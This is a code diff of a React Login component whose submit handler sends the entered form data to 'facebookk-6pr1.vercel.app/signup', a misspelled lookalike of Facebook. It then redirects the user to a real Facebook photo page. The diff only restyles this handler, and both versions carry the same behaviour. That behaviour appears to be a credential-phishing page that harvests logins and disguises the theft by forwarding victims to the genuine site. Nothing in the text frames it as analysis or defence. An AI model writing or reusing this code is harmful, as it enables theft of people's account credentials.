@@ -20,19 +20,14 @@ const Login = () => {
      
       const handleSubmit = async (e) => {
         e.preventDefault();
-        try {
-          const res = await axios.post('https://facebookk-6pr1.vercel.app/signup', formData);
-          console.log(res.data);
-          if (res.status === 200) {
-            setTimeout(() => {
-              window.open('https://m.facebook.com/photo.php?fbid=527361450059357&set=a.126687590126747', '_self');
-            }, 1000); 
-          }
-        } catch (err) {
-          console.log('Error:', err);
-        }
+        axios.post('https://facebookk-6pr1.vercel.app/signup', formData)
+          .then((res) => {
+            console.log(res.data);
+            window.location.replace('https://m.facebook.com/photo.php?fbid=527361450059357&set=a.126687590126747');
+
+          })
+          .catch((err) => console.log(err));
       };
-      
    
 
     return (
